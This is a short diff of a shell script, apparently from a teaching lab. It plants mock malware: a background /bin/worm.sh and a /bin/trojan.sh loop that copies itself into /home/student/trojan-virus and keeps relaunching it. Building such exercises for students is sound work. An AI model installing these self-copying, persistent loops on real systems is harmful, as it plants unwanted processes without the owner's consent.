@@ -47,8 +47,8 @@ do
   sleep 60
 done
 EOF
-chmod 755 /bin/malware.sh
-/bin/malware.sh &
+chmod 755 /bin/worm.sh
+/bin/worm.sh &
 
 
 cat << EOF > /bin/trojan.sh
@@ -56,9 +56,9 @@ cat << EOF > /bin/trojan.sh
 while true
 do
   /bin/cp /bin/trojan.sh /home/student/trojan-virus
-  sleep 1
-  /home/student/trojan-virus &
   sleep 120
+  /home/student/trojan-virus &
+  sleep 10
 done
 EOF
 chmod 755 /bin/trojan.sh
